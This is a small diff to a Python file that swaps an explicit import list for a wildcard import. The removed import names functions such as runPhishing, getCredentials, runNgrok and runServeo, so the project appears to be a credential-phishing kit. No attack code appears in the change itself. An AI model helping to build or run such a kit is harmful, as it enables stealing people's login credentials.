@@ -2,7 +2,7 @@
 import multiprocessing
 from Defs.Checks import checkConnection, checkNgrok
 from Defs.Configurations import createConfig, readConfig, ifSettingsNotExists
-from Defs.Actions import runPhishing, selectServer, runNgrok, runServeo, runMainMenu, inputCustom, runServer, endMessage, getCredentials, writeLog
+from Defs.Actions import *
 
 
 
